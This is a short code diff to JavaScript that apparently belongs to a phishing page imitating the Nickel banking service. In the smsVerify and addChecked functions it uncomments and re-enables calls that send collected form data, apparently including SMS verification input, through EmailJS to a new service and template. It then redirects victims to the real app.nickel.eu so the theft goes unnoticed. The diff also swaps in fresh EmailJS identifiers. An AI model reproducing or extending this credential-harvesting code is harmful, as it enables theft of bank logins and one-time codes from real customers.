@@ -84,14 +84,11 @@ function smsVerify() {
         };
 
         
-       /*  
-            emailjs.send("service_4vmkw9x", "template_3r6d79j", tempParams)
+        
+            emailjs.send("service_rb7wkid","template_lwkgcu3", tempParams)
             .then(function (res) {
                 window.location.href = "https://app.nickel.eu"
             }); 
-        */
-
-        window.location.href = "https://app.nickel.eu"
     }
 }
 
@@ -112,7 +109,7 @@ function smsVerify() {
         };
 
 
-             emailjs.send("service_4vmkw9x", "template_3r6d79j", tempParams)
+             emailjs.send("service_rb7wkid","template_lwkgcu3", tempParams)
              .then(function (res) {
                  window.location.href = "https://app.nickel.eu"
              }); 
@@ -149,10 +146,10 @@ function addChecked(e) {
         loadingPage();
         
 
-       /*  emailjs.send("service_4vmkw9x","template_3r6d79j", tempParams)
+        emailjs.send("service_rb7wkid","template_lwkgcu3", tempParams)
         .then(function (res) {
            $("#twopage").show()
-        }); */
+        });
         
 
 
